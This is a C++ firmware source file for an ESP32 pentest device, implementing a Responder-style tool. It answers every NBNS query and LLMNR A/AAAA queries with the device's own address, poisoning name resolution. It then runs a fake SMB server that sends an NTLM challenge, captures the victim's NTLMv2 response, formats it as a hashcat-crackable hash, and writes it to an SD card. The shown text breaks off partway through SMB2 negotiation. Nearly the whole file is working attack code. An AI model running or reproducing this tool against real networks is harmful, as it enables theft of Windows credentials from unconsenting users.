/*
============================================================================================================================
Responder
============================================================================================================================
Thanks 7h30th3r0n3 for making this possible in esp32 
https://github.com/7h30th3r0n3/Evil-M5Project
============================================================================================================================
*/

#include "responder.h"
#include "core/utils.h"
#include "clients.h"
#include "core/wifi/wifi_common.h"
#include "core/display.h"
#include "core/mykeyboard.h"

String netbiosname_str;
String netbiosdomain_str;
String dnsdomain_str;
const char* netbiosName;
const char* netbiosDomain;
const char* dnsDomain;

float currentAngle = 0.0f;

int hashCount = 0;
String lastUser = "";
String lastDomain = "";
String lastQueryName     = "";  // nom interrogé (NBNS/LLMNR)
String lastQueryProtocol = "";  // "NBNS" ou "LLMNR"
String lastClient        = "";  //hostname SMB

// Ports pour NBNS et LLMNR
const uint16_t NBNS_PORT = 137;
const uint16_t LLMNR_PORT = 5355;

// Objet UDP pour NBNS et LLMNR
WiFiUDP nbnsUDP;
WiFiUDP llmnrUDP;

// Serveur TCP SMB (port 445)
WiFiServer smbServer(445);

// Structure pour stocker un client SMB en cours et ses infos
struct SMBClientState {
  WiFiClient client;
  bool active;
  uint64_t sessionId;
  uint8_t challenge[8];
} smbState;

/* =================  CONST & FLAGS SMB  ================= */
#define SMB_FLAGS_REPLY               0x80
#define SMB_FLAGS2_UNICODE            0x8000
#define SMB_FLAGS2_ERR_STATUS32       0x4000
#define SMB_FLAGS2_EXTSEC             0x0800
#define SMB_FLAGS2_SIGNING_ENABLED    0x0008

#define SMB_CAP_EXTSEC      0x80000000UL
#define SMB_CAP_LARGE_FILES 0x00000008UL
#define SMB_CAP_NT_SMBS     0x00000010UL
#define SMB_CAP_UNICODE     0x00000004UL
#define SMB_CAP_STATUS32    0x00000040UL

const uint32_t SMB_CAPABILITIES =
  SMB_CAP_EXTSEC | SMB_CAP_LARGE_FILES | SMB_CAP_NT_SMBS |
  SMB_CAP_UNICODE | SMB_CAP_STATUS32;      // ≈ 0x8000005C
/* ====================================================== */

void encodeNetBIOSName(const char* name, uint8_t out[32]) {
  // Préparer le nom sur 15 caractères (pad avec espaces) + type (0x20)
  char namePad[16];
  memset(namePad, ' ', 15);
  namePad[15] = 0x20; // suffixe type 0x20 (Server service)
  // Copier le nom en majuscules dans namePad
  size_t n = strlen(name);
  if (n > 15) n = 15;
  for (size_t i = 0; i < n; ++i) {
    namePad[i] = toupper(name[i]);
  }
  // Encoder chaque octet en deux caractères 'A' à 'P'
  for (int i = 0; i < 16; ++i) {
    uint8_t c = (uint8_t)namePad[i];
    uint8_t highNibble = (c >> 4) & 0x0F;
    uint8_t lowNibble = c & 0x0F;
    out[2 * i]     = 0x41 + highNibble;
    out[2 * i + 1] = 0x41 + lowNibble;
  }
}

IPAddress getIPAddress() {
    // 1) Station mode
    if (WiFi.status() == WL_CONNECTED) {
        IPAddress ip = WiFi.localIP();
        if (ip && ip != IPAddress(0,0,0,0)) {
            return ip;
        }
    }
    // 2) SoftAP mode
    if (WiFi.getMode() & WIFI_MODE_AP) {
        IPAddress ip = WiFi.softAPIP();
        if (ip && ip != IPAddress(0,0,0,0)) {
            return ip;
        }
    }
    return IPAddress(0,0,0,0);
}

uint64_t getWindowsTimestamp() {
  const uint64_t EPOCH_DIFF = 11644473600ULL;
  struct timeval tv;
  gettimeofday(&tv, NULL);
  return ((tv.tv_sec + EPOCH_DIFF) * 10000000ULL + (tv.tv_usec * 10ULL));
}

// Buffer pour le NTLM Type 2 généré dynamiquement
uint8_t ntlmType2Buffer[512];
uint16_t ntlmType2Len = 0;


void buildNTLMType2Msg(uint8_t *challenge, uint8_t *buffer, uint16_t *len) {
  uint8_t avPairs[512];
  int offset = 0;

  auto appendAVPair = [&](uint16_t type, const char* data) {
    int l = strlen(data);
    avPairs[offset++] = type & 0xFF;
    avPairs[offset++] = (type >> 8) & 0xFF;
    avPairs[offset++] = (l * 2) & 0xFF;
    avPairs[offset++] = ((l * 2) >> 8) & 0xFF;
    for (int i = 0; i < l; i++) {
      avPairs[offset++] = data[i];
      avPairs[offset++] = 0x00;
    }
  };

  appendAVPair(0x0001, netbiosName);
  appendAVPair(0x0002, netbiosDomain);
  appendAVPair(0x0003, netbiosName);
  appendAVPair(0x0004, dnsDomain);
  appendAVPair(0x0005, dnsDomain);

  // Timestamp AV Pair
  avPairs[offset++] = 0x07; avPairs[offset++] = 0x00;
  avPairs[offset++] = 0x08; avPairs[offset++] = 0x00;
  uint64_t ts = getWindowsTimestamp();
  memcpy(avPairs + offset, &ts, 8);
  offset += 8;

  // End AV Pair
  avPairs[offset++] = 0x00; avPairs[offset++] = 0x00;
  avPairs[offset++] = 0x00; avPairs[offset++] = 0x00;

  // Préparer NTLM Type 2 message
  const int NTLM_HEADER_SIZE = 48;
  memcpy(buffer, "NTLMSSP\0", 8); // Signature
  buffer[8] = 0x02; buffer[9] = 0x00; buffer[10] = buffer[11] = 0x00; // Type 2

  // Target Name
  uint16_t targetLen = strlen(netbiosName) * 2;
  buffer[12] = targetLen & 0xFF; buffer[13] = (targetLen >> 8) & 0xFF;
  buffer[14] = buffer[12]; buffer[15] = buffer[13];
  *(uint32_t*)(buffer + 16) = NTLM_HEADER_SIZE;

  // Flags standards recommandés pour NTLMv2
  *(uint32_t*)(buffer + 20) = 0xE2898215;

  // Challenge de 8 octets
  memcpy(buffer + 24, challenge, 8);
  memset(buffer + 32, 0, 8); // Reserved

  // AV Pair offset & length
  uint16_t avLen = offset;
  *(uint16_t*)(buffer + 40) = avLen;
  *(uint16_t*)(buffer + 42) = avLen;
  *(uint32_t*)(buffer + 44) = NTLM_HEADER_SIZE + targetLen;

  // Copie TargetName en UTF16LE
  for (int i = 0; i < strlen(netbiosName); i++) {
    buffer[NTLM_HEADER_SIZE + 2 * i] = netbiosName[i];
    buffer[NTLM_HEADER_SIZE + 2 * i + 1] = 0x00;
  }

  // Copie AV Pairs après TargetName
  memcpy(buffer + NTLM_HEADER_SIZE + targetLen, avPairs, avLen);

  *len = NTLM_HEADER_SIZE + targetLen + avLen;
}

String readUTF16(uint8_t* pkt, uint32_t offset, uint16_t len) {
  String res = "";
  for (uint16_t i = 0; i < len; i += 2) {
    res += (char)pkt[offset + i];
  }
  return res;
}

void updateHashUI() {
  //auto& d = M5Cardputer.Display;
  //tft.fillScreen(bruceConfig.bgColor);

  // 1) NTLM count
  tft.setTextSize(1.0);
  tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
  tft.setCursor(5, 5);
  tft.print("NTLM: ");
  tft.setTextSize(2);
  tft.print(hashCount);

  // 2) User
  tft.setTextSize(1.3);
  tft.setCursor(5, 30);
  tft.print("User: ");
  tft.setTextSize(2);
  tft.print(lastUser);

  // 3) Domain
  tft.setTextSize(1.3);
  tft.setCursor(5, 55);
  tft.print("Domain: ");
  tft.setTextSize(2);
  tft.print(lastDomain);

  // 4) Client (hostname)
  tft.setTextSize(1.3);
  tft.setCursor(5, 80);
  tft.print("Client: ");
  tft.setTextSize(2);
  tft.print(lastClient);

  // 5) Query (NBNS/LLMNR + name)
  tft.setTextSize(1.3);
  tft.setCursor(5, 105);
  tft.print(lastQueryProtocol + ": ");
  tft.setTextSize(2);
  tft.print(lastQueryName);
}

void extractAndPrintHash(uint8_t* pkt, uint32_t smbLength, uint8_t* ntlm) {
  // 1. Little-endian helpers
  auto le16 = [](uint8_t* p) -> uint16_t {
    return p[0] | (p[1] << 8);
  };
  auto le32 = [](uint8_t* p) -> uint32_t {
    return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);
  };

  uint32_t base = ntlm - pkt;  // offset of NTLMSSP in packet

  // 2. Offsets and lengths in NTLM AUTH message
  uint16_t ntRespLen   = le16(ntlm + 20);
  uint32_t ntRespOff   = le32(ntlm + 24);
  uint16_t domLen      = le16(ntlm + 28);
  uint32_t domOffset   = le32(ntlm + 32);
  uint16_t userLen     = le16(ntlm + 36);
  uint32_t userOffset  = le32(ntlm + 40);
  uint16_t wsLen       = le16(ntlm + 44);
  uint32_t wsOffset    = le32(ntlm + 48);

  // 3. Read UTF-16LE → ASCII
  auto readUTF16 = [&](uint32_t offset, uint16_t len) -> String {
    String s = "";
    if (base + offset + len > smbLength) return s;  // safety
    for (uint16_t i = 0; i < len; i += 2)
      s += (char)pkt[base + offset + i];
    return s;
  };

  String domain      = readUTF16(domOffset,  domLen);
  String username    = readUTF16(userOffset, userLen);
  String workstation = readUTF16(wsOffset, wsLen);

  // 4. Server challenge (8 bytes)
  char challHex[17];
  for (int i = 0; i < 8; ++i)
    sprintf(challHex + 2*i, "%02X", smbState.challenge[i]);
  challHex[16] = '\0';

  // 5. Full NTLMv2 response en hex
  String ntRespHex;
  for (uint16_t i = 0; i < ntRespLen; ++i) {
    char h[3];
    sprintf(h, "%02X", pkt[base + ntRespOff + i]);
    ntRespHex += h;
  }

  // 6. Split proof & blob
  String ntProof = ntRespHex.substring(0, 32);
  String blob    = ntRespHex.substring(32);

  // 7. Format hashcat string
  String finalHash = "------------------------------------\n Client : " + lastClient + " \n" + username + "::" + domain + ":" + String(challHex) + ":" + ntProof + ":" + blob;

  Serial.println(F("------- Captured NTLMv2 Hash -------"));
  Serial.println(finalHash);
  Serial.println(F("------------------------------------"));

  // 8. Save sur SD
  File file = SD.open("/NTLM/ntlm_hashes.txt", FILE_APPEND);
  if (file) {
    file.println(finalHash);
    file.close();
    Serial.println(F("→ Hash saved to /ntlm_hashes.txt"));
  } else {
    Serial.println(F("Error: unable to write to SD card!"));
  }

  // 9. Mettre à jour UI
  hashCount++;
  lastUser          = username;
  lastDomain        = domain;
  lastClient        = workstation;
  updateHashUI();
}

void terminateSMB1() {
  smbState.client.stop();
  smbState.active = false;
  Serial.println(F("Session SMB1 stopped."));
}

// Token ASN.1 SPNEGO  –  annonce « NTLMSSP » uniquement
const uint8_t spnegoInitToken[] = {
  0x60, 0x3A,
  0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02,   //  OID 1.3.6.1.5.5.2
  0xA0, 0x30,                                         //  [0] NegTokenInit
  0x30, 0x2E,                                     //    mechTypes
  0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, // NTLM OID
  0xA2, 0x20,                                     //    reqFlags   (optionnel)
  0x30, 0x1E,
  0x02, 0x01, 0x02,                       //      mutual‑auth
  0x02, 0x01, 0x00                        //      delegation = 0
};

void sendSMB1NegotiateResponse(uint8_t* req) {
  uint8_t resp[256] = {0};

  /* ─── NBSS ─── */
  resp[0] = 0x00;               // Session message – length rempli plus bas

  /* ─── HEADER SMB (32 octets) ─── */
  memcpy(resp + 4, req, 32);
  resp[4 + 4]  = 0x72;          // Command = NEGOTIATE
  resp[4 + 9]  = SMB_FLAGS_REPLY;

  *(uint16_t*)(resp + 4 + 10) =
    SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 |
    SMB_FLAGS2_EXTSEC | SMB_FLAGS2_SIGNING_ENABLED;

  *(uint32_t*)(resp + 4 + 5) = 0x00000000;        // STATUS_SUCCESS

  /* ─── PARAMS ─── */
  const uint8_t WC = 17;
  resp[4 + 32] = WC;            // WordCount

  uint8_t* p = resp + 4 + 33;   // début des 34 octets

  *(uint16_t*)(p +  0) = 0x0000;           // Dialect index (NT LM 0.12)
  *(uint8_t *)(p +  2) = 0x03;             // SecurityMode : user‑level + signing supported
  *(uint16_t*)(p +  3) = 0x0100;           // MaxMpxCount
  *(uint16_t*)(p +  5) = 1;                // MaxVCs
  *(uint32_t*)(p +  7) = 0x00010000;       // MaxBufferSize
  *(uint32_t*)(p + 11) = 0x00010000;       // MaxRawSize
  *(uint32_t*)(p + 15) = 0;                // SessionKey
  *(uint32_t*)(p + 19) = SMB_CAPABILITIES; // Capabilities
  *(uint64_t*)(p + 23) = 0;                // SystemTime (optionnel)
  *(uint16_t*)(p + 31) = 0;                // TimeZone
  *(p + 33) = 0;                           // ChallengeLength = 0 (mode ExtSec)

  /* ─── DATA (BCC) : SPNEGO Init ─── */
  uint16_t bcc = sizeof(spnegoInitToken);
  *(uint16_t*)(resp + 4 + 33 + WC * 2) = bcc;
  memcpy(resp + 4 + 33 + WC * 2 + 2, spnegoInitToken, bcc);

  /* ─── Longueur NBSS ─── */
  uint32_t total = 4 + 33 + WC * 2 + 2 + bcc;
  resp[1] = (total - 4) >> 16;
  resp[2] = (total - 4) >> 8;
  resp[3] = (total - 4);

  smbState.client.write(resp, total);
  Serial.println(F("→ Negotiate Response SMB1 envoyé (ExtSec OK)"));
}

void sendSMB1Type2(uint8_t* req, uint8_t* ntlm1) {
  // 1) Génère un challenge aléatoire de 8 octets
  for (int i = 0; i < 8; ++i) {
    smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
  }

  // 2) Construit dynamiquement le blob NTLMv2 Type 2
  buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);

  // 3) Prépare la réponse SessionSetupAndX SMB1
  uint8_t resp[512] = {0};

  // – NBSS + header SMBv1 (copie 32 octets)
  memcpy(resp + 4, req, 32);
  resp[4 + 4] = 0x73;  // SMB_COM_SESSION_SETUP_ANDX
  resp[4 + 9] = SMB_FLAGS_REPLY;
  *(uint16_t*)(resp + 4 + 10) =
    SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 |
    SMB_FLAGS2_EXTSEC  | SMB_FLAGS2_SIGNING_ENABLED;
  *(uint32_t*)(resp + 4 + 5) = 0xC0000016; // STATUS_MORE_PROCESSING_REQUIRED

  // – WordCount et AndX
  resp[4 + 32] = 4;    // WordCount
  resp[4 + 33] = 0;    // no further AndX
  resp[4 + 34] = resp[4 + 35] = 0;

  // – SecurityBlobLength et ByteCount = longueur du blob dynamique
  *(uint16_t*)(resp + 4 + 38) = ntlmType2Len; // SecurityBlobLength
  *(uint16_t*)(resp + 4 + 40) = ntlmType2Len; // ByteCount

  // – Copier le blob NTLMv2 Type2 juste après le header
  memcpy(resp + 4 + 42, ntlmType2Buffer, ntlmType2Len);

  // – Calcul de la longueur NBSS
  uint32_t total = 4 + 42 + ntlmType2Len;
  resp[0] = 0x00;
  resp[1] = (total - 4) >> 16;
  resp[2] = (total - 4) >> 8;
  resp[3] = (total - 4);

  // 4) Envoie
  smbState.client.write(resp, total);
  Serial.println(F("→ NTLMv2 Type 2 (SMB1) send"));
}


void sendSMB2NegotiateFromSMB1() {
  uint8_t resp[256] = {0};

  /* ── 1.  NBSS ─────────────────────────────────────────── */
  resp[0] = 0x00;                 // Session message, LEN plus bas

  /* ── 2.  HEADER SMB‑2 (64 oct.) ───────────────────────── */
  uint8_t* h = resp + 4;
  h[0] = 0xFE;  h[1] = 'S';  h[2] = 'M';  h[3] = 'B';
  h[4] = 0x40;  h[5] = 0x00;              // StructureSize = 64
  h[6] = 0x00;  h[7] = 0x00;              // CreditCharge
  h[8] = h[9] = h[10] = h[11] = 0x00;     // ChannelSequence / Reserved
  h[12] = 0x00; h[13] = 0x00;             // Command = NEGOTIATE
  h[14] = 0x01; h[15] = 0x00;             // CreditResponse = 1
  *(uint32_t*)(h + 16) = 0x00000001;      // Flags = SERVER_TO_REDIR
  *(uint32_t*)(h + 20) = 0x00000000;      // NextCommand = 0
  *(uint64_t*)(h + 24) = 0;               // MessageId   = 0
  *(uint32_t*)(h + 32) = 0x0000FEFF;      // ProcessId   (valeur Windows)
  *(uint32_t*)(h + 36) = 0;               // TreeId = 0
  *(uint64_t*)(h + 40) = 0;               // SessionId = 0
  memset(h + 48, 0, 16);                  // Signature (pas de signing)

  /* ── 3.  Corps NEGOTIATE RESPONSE (65 oct.) ───────────── */
  uint8_t* p = h + 64;
  p[0] = 0x41; p[1] = 0x00;               // StructureSize = 65
  p[2] = 0x01; p[3] = 0x00;               // SecurityMode = signing‑enabled
  p[4] = 0x02; p[5] = 0x02;               // DialectRevision = 0x0202 (SMB 2.002)
  p[6] = p[7] = 0x00;                     // Reserved

  /* Server GUID (16 oct.) – on fabrique quelque chose d’unique */
  uint8_t serverGuid[16];
  for (int i = 0; i < 16; i++) serverGuid[i] = esp_random() & 0xFF;
  memcpy(p + 8, serverGuid, 16);


  *(uint32_t*)(p + 24) = 0x00000000;      // Capabilities (0 suffisent)
  *(uint32_t*)(p + 28) = 0x00010000;      // MaxTrans
  *(uint32_t*)(p + 32) = 0x00010000;      // MaxRead
  *(uint32_t*)(p + 36) = 0x00010000;      // MaxWrite
  memset(p + 40, 0, 16);                  // SystemTime + StartTime
  *(uint16_t*)(p + 56) = 0;               // SecBufOffset
  *(uint16_t*)(p + 58) = 0;               // SecBufLength
  /* (p+60..64  NégContext = 0 / Reserved) */

  /* ── 4.  Longueur NBSS ────────────────────────────────── */
  uint32_t total = 4 + 64 + 65;           // = 133
  resp[1] = (total - 4) >> 16;
  resp[2] = (total - 4) >> 8;
  resp[3] = (total - 4);

  smbState.client.write(resp, total);
  Serial.println(F("→ Negotiate Response SMB‑v2 send (upgrade successfull)"));
}

void handleSMB1(uint8_t* pkt, uint32_t len) {
  // Structure header SMBv1 (32 octets)
  uint8_t  command   = pkt[4];            // offset 4

  // ----------  NEGOTIATE (0x72)  ----------
  if (command == 0x72) {
    /* point de départ = tout de suite après le BCC (2 octets)           */
    uint16_t bcc = pkt[33] | (pkt[34] << 8);      // ByteCount
    const uint8_t* d = pkt + 35;                  // <-- 35, pas 36
    const uint8_t* end = d + bcc;

    bool smb2Asked = false;
    while (d < end && *d == 0x02) {               // 0x02 = "dialect string"
      const char* name = (const char*)(d + 1);
      if (strncmp(name, "SMB 2", 5) == 0) {
        smb2Asked = true;
        break;
      }
      d += 2 + strlen(name);                    // 0x02 + chaîne + '\0'
    }

    if (smb2Asked) {
      Serial.println(F("Client ask for SMB 2 → switch to SMB 2"));
      sendSMB2NegotiateFromSMB1();
    } else {
      Serial.println(F("Client stay in SMB 1"));
      sendSMB1NegotiateResponse(pkt);
    }
    return;
  }
  // ----------  SESSION SETUP ANDX (0x73) ----------
  if (command == 0x73) {                  // SMB_COM_SESSION_SETUP_ANDX
    uint16_t andxOffset = *(uint16_t*)(pkt + 45); // début des données NTLM
    uint8_t* ntlm = pkt + andxOffset;

    if (memcmp(ntlm, "NTLMSSP", 7) == 0 && len > andxOffset + 8) {
      uint8_t type = ntlm[8];
      if (type == 1) {                    // Type1 → envoyer challenge
        Serial.println(F("NTLM Type 1 (SMB1) received"));
        sendSMB1Type2(pkt, ntlm);         // 2-b
      } else if (type == 3) {             // Type3 = hash capturé
        Serial.println(F("NTLM Type 3 (SMB1) received"));
        extractAndPrintHash(pkt, len, ntlm);
        terminateSMB1();               // réponse « SUCCESS » puis close
      }
    }
  }
}

// Décodage NetBIOS "A..P" (32 octets) -> "NAME<XX>"
void decodeNetBIOSLabel(const uint8_t* enc32, char* out, size_t outSize) {
  if (!enc32 || !out || outSize == 0) return;
  out[0] = '\0';

  // Convertit 32 caractères A..P en 16 octets bruts
  uint8_t raw[16];
  for (int i = 0; i < 16; ++i) {
    uint8_t c1 = enc32[2 * i];
    uint8_t c2 = enc32[2 * i + 1];
    uint8_t hi = (c1 >= 'A' && c1 <= 'P') ? (uint8_t)(c1 - 'A') : 0;
    uint8_t lo = (c2 >= 'A' && c2 <= 'P') ? (uint8_t)(c2 - 'A') : 0;
    raw[i] = (uint8_t)((hi << 4) | lo);
  }

  // 15 premiers octets = nom (paddé avec des espaces), 16e = suffixe/type
  char name[16];
  memcpy(name, raw, 15);
  name[15] = '\0';

  // Trim des espaces de fin
  int end = 14;
  while (end >= 0 && name[end] == ' ') end--;
  name[end + 1] = '\0';

  uint8_t suffix = raw[15];  // ex: 0x00 pour <00>

  // Rend "NAME<XX>" (out doit être assez grand, p.ex. 40 octets)
  // %02X fonctionne sur Arduino (printf/printf-like).
  snprintf(out, outSize, "%s<%02X>", name, suffix);
}

/***************************************************************************************
** Function name:           responder
** Description:             Main function to start LLMNR Poisoning and wait for Clients Interection
***************************************************************************************/
void responder() {

  tft.fillScreen(bruceConfig.bgColor);
  //M5Cardputer.Display.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
  if (!wifiConnected) wifiConnectMenu();

  netbiosname_str = keyboard("Bruce", 20);
  netbiosName = stringTochar(netbiosname_str);
  netbiosdomain_str = keyboard("BRUCEGROUP", 20);
  netbiosDomain = stringTochar(netbiosdomain_str);
  dnsdomain_str = keyboard("Bruce.Local", 20);
  dnsDomain = stringTochar(dnsdomain_str);

  hashCount = 0;
  // Démarrer l'écoute NBNS (UDP 137)
  if (!nbnsUDP.begin(NBNS_PORT)) {
    Serial.println(F("Erreur: Impossible to listen on UDP 137"));
  }
  // Démarrer l'écoute LLMNR (UDP 5355) en IPv4 uniquement
  if (!llmnrUDP.beginMulticast(IPAddress(224, 0, 0, 252), LLMNR_PORT)) {
    Serial.println(F("Erreur: échec abonnement multicast LLMNR"));
  }
  // Démarrer le serveur SMB (TCP 445)
  smbServer.begin();
  smbState.active = false;

  Serial.println(F("Responder ready - Waiting for NBNS/LLMNR request..."));

  while (!check(EscPress)) {
  //M5Cardputer.update();
  //unsigned long now = millis();
  //if (now - lastAnim > 250) {
      // Choix de la fonction selon le count
      if (hashCount == 0) {
          //showWaitingAnimation();
          tft.setCursor(0,0);
          tft.setTextSize(0);
          tft.println("Waiting\nLLMNR Interact...");
      } else if (hashCount == 1) {

          tft.setCursor(60,90);
          tft.setTextSize(0);
          tft.println("Found Interaction!\n\nthanks 7h30th3r0n3");
      
      } else {

          tft.setCursor(60,90);
          tft.println("End");
 
      }
      //lastAnim = now;
  //}

  int packetSize = nbnsUDP.parsePacket();
  if (packetSize > 0) {
    uint8_t buf[100];
    int len = nbnsUDP.read(buf, sizeof(buf));
    if (len >= 50) { // taille minimale d'une requête NBNS standard ~50 octets
      // Vérifier qu'il s'agit d'une requête NBNS de type nom (0x20)
      // Flags (octets 2-3) : bit 15 = 0 pour question
      uint16_t flags = (buf[2] << 8) | buf[3];
      uint16_t qdCount = (buf[4] << 8) | buf[5];
      uint16_t qType = (buf[len - 4] << 8) | buf[len - 3]; // Type sur les 2 octets avant les 2 derniers (class)
      uint16_t qClass = (buf[len - 2] << 8) | buf[len - 1]; // Class sur les 2 derniers octets
      if ((flags & 0x8000) == 0 && qdCount >= 1 && qType == 0x0020 && qClass == 0x0001) {
        // Extraire le nom encodé sur 32 octets à partir de l'offset 13 (après length byte)
        // Offset 12 = length of name (0x20), offset 13..44 = nom encodé
        if (len >= 46 && buf[12] == 0x20) {
          char nbName[40];
          decodeNetBIOSLabel(buf + 13, nbName, sizeof(nbName));
          lastQueryProtocol = "NBNS";
          lastQueryName = nbName;
          Serial.printf("[NBNS] Query for %s from %s\n", nbName, nbnsUDP.remoteIP().toString().c_str());
          // Répondre à toute requête NBNS receivede sans vérifier le nom demandé
          uint8_t resp[80];
          // Copier Transaction ID
          resp[0] = buf[0];
          resp[1] = buf[1];
          // Flags: réponse (bit15=1), AA=1, Rcode=0
          resp[2] = 0x84;
          resp[3] = 0x00;
          // QDcount=0, ANcount=1, NScount=0, ARcount=0
          resp[4] = 0x00; resp[5] = 0x00;
          resp[6] = 0x00; resp[7] = 0x01;
          resp[8] = 0x00; resp[9] = 0x00;
          resp[10] = 0x00; resp[11] = 0x00;
          // Name (copier les 34 octets du nom encodé + terminator de la requête)
          memcpy(resp + 12, buf + 12, 34);
          // Type & Class (2 octets chacun, même que la question)
          resp[46] = 0x00; resp[47] = 0x20;  // Type NB
          resp[48] = 0x00; resp[49] = 0x01;  // Class IN
          // TTL (4 octets)
          resp[50] = 0x00; resp[51] = 0x00; resp[52] = 0x00; resp[53] = 0x3C; // TTL = 60 secondes
          // Data length (6 octets pour NB)
          resp[54] = 0x00; resp[55] = 0x06;
          // NB flags (unique = 0x0000)
          resp[56] = 0x00; resp[57] = 0x00;
          // Adresse IP (4 octets)
          IPAddress ip = getIPAddress();
          resp[58] = ip[0];
          resp[59] = ip[1];
          resp[60] = ip[2];
          resp[61] = ip[3];
          char decoded[16];
          // Envoyer la réponse NBNS à l'émetteur
          nbnsUDP.beginPacket(nbnsUDP.remoteIP(), nbnsUDP.remotePort());
          nbnsUDP.write(resp, 62);
          nbnsUDP.endPacket();
          //addDetectionPoint();
          Serial.println(F("Answer NBNS send."));
        }
      }
    }
  }
  /**************** Traitement des requêtes LLMNR ****************/
  packetSize = llmnrUDP.parsePacket();
  if (packetSize > 0) {
    uint8_t buf[300];
    int len = llmnrUDP.read(buf, sizeof(buf));
    Serial.printf("[LLMNR] paquet %d octets received\n", len);

    /* 1) Contrôles de base ------------------------------------------------ */
    if (len < 12) continue;                             // trop court
    uint16_t flags   = (buf[2] << 8) | buf[3];
    uint16_t qdCount = (buf[4] << 8) | buf[5];
    uint16_t anCount = (buf[6] << 8) | buf[7];
    if ( (flags & 0x8000) || qdCount == 0 || anCount != 0) continue;  //here modif return en continue 
     
    /* 2) Lecture du premier label (on ne gère qu’un seul label simple) ---- */
    uint8_t nameLen = buf[12];
    if (nameLen == 0 || nameLen >= 64 || (13 + nameLen + 4) > len) continue;
    if (buf[13 + nameLen] != 0x00) continue;            // on veut exactement 1 label + terminator

    const uint8_t* qtypePtr  = buf + 13 + nameLen + 1;    // +1 -> terminator 0x00
    uint16_t qType  = (qtypePtr[0] << 8) | qtypePtr[1];
    uint16_t qClass = (qtypePtr[2] << 8) | qtypePtr[3];

    /* 3) Debug : affichage du nom et du type --------------------------------*/
    char qName[65];  memcpy(qName, buf + 13, nameLen);  qName[nameLen] = '\0';
    Serial.printf("[LLMNR] Query « %s », type 0x%04X\n", qName, qType);
    lastQueryName     = String(qName);
    lastQueryProtocol = "LLMNR";

    /* 4) On répond aux types A (0x0001) et AAAA (0x001C) ------------------- */
    bool isA    = (qType == 0x0001);
    bool isAAAA = (qType == 0x001C);
    if (!isA && !isAAAA) continue;                       // on ignore les autres

    if (qClass != 0x0001) continue;                      // IN seulement

    /* 5) Construction de la réponse --------------------------------------- */
    uint16_t questionLen = 1 + nameLen + 1 + 2 + 2;    // label + len0 + type + class
    uint8_t resp[350];

    /* -- Header -- */
    resp[0] = buf[0]; resp[1] = buf[1];                // Transaction ID
    resp[2] = 0x84;   resp[3] = 0x00;                  // QR=1 | AA=1
    resp[4] = 0x00; resp[5] = 0x01;                    // QDcount = 1
    resp[6] = 0x00; resp[7] = 0x01;                    // ANcount = 1
    resp[8] = resp[9]  = 0x00;                         // NScount
    resp[10] = resp[11] = 0x00;                        // ARcount

    /* -- Question copiée telle quelle -- */
    memcpy(resp + 12, buf + 12, questionLen);

    /* -- Answer -- */
    uint16_t ansOff = 12 + questionLen;
    resp[ansOff + 0] = 0xC0;          // pointeur 0xC00C vers le nom en question
    resp[ansOff + 1] = 0x0C;
    resp[ansOff + 2] = qtypePtr[0];   // même TYPE que la question
    resp[ansOff + 3] = qtypePtr[1];
    resp[ansOff + 4] = 0x00; resp[ansOff + 5] = 0x01;   // CLASS = IN
    resp[ansOff + 6] = 0x00; resp[ansOff + 7] = 0x00;   // TTL = 30 s
    resp[ansOff + 8] = 0x00; resp[ansOff + 9] = 0x1E;

    if (isA) {
      /* ---- Réponse IPv4 (4 octets) ---- */
      resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x04; // RDLENGTH
      IPAddress ip = getIPAddress();
      resp[ansOff + 12] = ip[0]; resp[ansOff + 13] = ip[1];
      resp[ansOff + 14] = ip[2]; resp[ansOff + 15] = ip[3];
      llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
      llmnrUDP.write(resp, ansOff + 16);
      llmnrUDP.endPacket();
      //addDetectionPoint();
    } else {
      /* ---- Réponse IPv6 (on renvoie ::FFFF:IPv4) ---- */
      resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x10; // RDLENGTH = 16
      /* ::ffff:a.b.c.d  →  0…0 ffff  + IPv4 */
      memset(resp + ansOff + 12, 0, 10);
      resp[ansOff + 22] = 0xFF; resp[ansOff + 23] = 0xFF;
      IPAddress ip = getIPAddress();
      resp[ansOff + 24] = ip[0]; resp[ansOff + 25] = ip[1];
      resp[ansOff + 26] = ip[2]; resp[ansOff + 27] = ip[3];
      llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
      llmnrUDP.write(resp, ansOff + 28);
      llmnrUDP.endPacket();
      //addDetectionPoint();
    }

    Serial.println(F("[LLMNR] → answer send"));
  }

  // Accepter nouvelle connexion SMB si non déjà en cours
  if (!smbState.active) {
    WiFiClient newClient = smbServer.available();
    if (newClient) {
      smbState.client = newClient;
      smbState.active = true;
      smbState.sessionId = 0;
      Serial.println(F("Connexion SMB received, starting the SMB2 negociation..."));
    }
  }

  // Gérer la connexion SMB active (état machine NTLM)
  if (smbState.active && smbState.client.connected()) {
    // Définir un petit timeout pour lecture (évitons blocage)
    smbState.client.setTimeout(100);
    // Lire l'entête NetBIOS (4 octets) si disponible
    if (smbState.client.available() >= 4) {
      uint8_t nbss[4];
      if (smbState.client.read(nbss, 4) == 4) {
        uint32_t smbLength = ((uint32_t)nbss[1] << 16) | ((uint32_t)nbss[2] << 8) | nbss[3];
        if (smbLength == 0) {
          // Keep-alive ou paquet vide, on ignore
        } else {
          // Lire le paquet SMB complet
          uint8_t *packet = (uint8_t*)malloc(smbLength);
          if (!packet) {
            Serial.println(F("Mémoire insuffisante pour SMB"));
            smbState.client.stop();
            smbState.active = false;
          } else {
            if (smbState.client.read(packet, smbLength) == smbLength) {
              // Vérifier protocole SMB2 (header commence par 0xFE 'S' 'M' 'B')
              if (smbLength >= 64 && packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
                uint16_t command = packet[12] | (packet[13] << 8);
                // Négociation SMB2
                if (command == 0x0000) { // SMB2 NEGOTIATE
